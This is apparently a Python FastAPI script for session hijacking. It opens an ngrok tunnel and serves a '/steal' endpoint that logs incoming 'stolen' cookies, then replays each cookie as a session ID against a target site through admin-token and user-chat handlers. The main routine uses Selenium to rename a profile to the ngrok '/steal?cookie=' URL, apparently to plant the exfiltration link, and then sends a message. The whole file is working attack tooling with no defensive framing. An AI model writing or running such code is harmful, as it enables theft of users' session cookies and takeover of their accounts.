from fastapi import FastAPI, HTTPException, Request
import uvicorn
from pyngrok import ngrok, conf
import threading  # Для запуска uvicorn и управления завершением программы

# from exceptions import ChainException
from selenium_start_point import run_capture_logic, close_driver
from requests_to_selenium import rename, message

app = FastAPI()

NGROK_PUBLIC_URL = None

stop_event = threading.Event()


def start_ngrok():
    global NGROK_PUBLIC_URL

    conf.get_default().region = "us"

    tunnel = ngrok.connect(8000, bind_tls=True)
    NGROK_PUBLIC_URL = tunnel.public_url
    print(f"Ngrok tunnel started: {NGROK_PUBLIC_URL}")


def shutdown_ngrok():
    ngrok.disconnect(NGROK_PUBLIC_URL)
    ngrok.kill()
    print("Ngrok tunnel shutdown")


# @app.options("/steal")
# async def options_steal():
#     return {
#         "Allow": "OPTIONS, GET",
#         "Content-Length": "0",
#         "Content-Type": "text/plain",
#     }


@app.options("/steal")
async def steal_cookie(request: Request):
    cookie = request.query_params.get("cookie", "No cookie received")
    print(f"Received stolen cookie: {cookie}")

    # Создаем контекст запроса
    from context import RequestContext
    from config import TARGET_URL, get_base_headers

    context = RequestContext(
        url=TARGET_URL,
        base_headers=get_base_headers(),
        session_id=cookie,
    )

    # Создаем цепочку обязанностей
    from handlers import AdminTokenHandler, UserChatHandler, LoggingHandler

    try:
        admin_handler = AdminTokenHandler()
        user_chat_handler = UserChatHandler()
        logging_handler = LoggingHandler()

        # Устанавливаем последовательность цепочки
        admin_handler.set_next(user_chat_handler).set_next(logging_handler)

        # Запускаем обработку запроса через цепочку
        admin_handler.handle_request(context)

        return {
            "message": "Request processed through Chain of Responsibility",
            "cookie": cookie,
        }

    except Exception as e:
        return {"error": f"Unexpected error: {str(e)}"}


def start_server():
    uvicorn.run(app, host="127.0.0.1", port=8000)


if __name__ == "__main__":
    try:
        start_ngrok()
        print("--- Starting FastAPI server ---")
        print("Visit http://127.0.0.1:8000/docs for API documentation")

        # Запуск uvicorn в отдельном потоке
        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()

        # Выполнение основного скрипта
        driver = run_capture_logic()
        rename(NGROK_PUBLIC_URL + "/steal?" + "cookie=")
        message()

        # Ожидание завершения программы
        print("Основной скрипт завершен. Сервер продолжает работу.")
        stop_event.wait()  # Блокировка основного потока до установки события

    except KeyboardInterrupt:
        print("Завершение работы по сигналу KeyboardInterrupt.")
        print("Завершение работы по сигналу KeyboardInterrupt.")

    finally:
        shutdown_ngrok()
        close_driver(driver)
        stop_event.set()  # Установка события для завершения программы
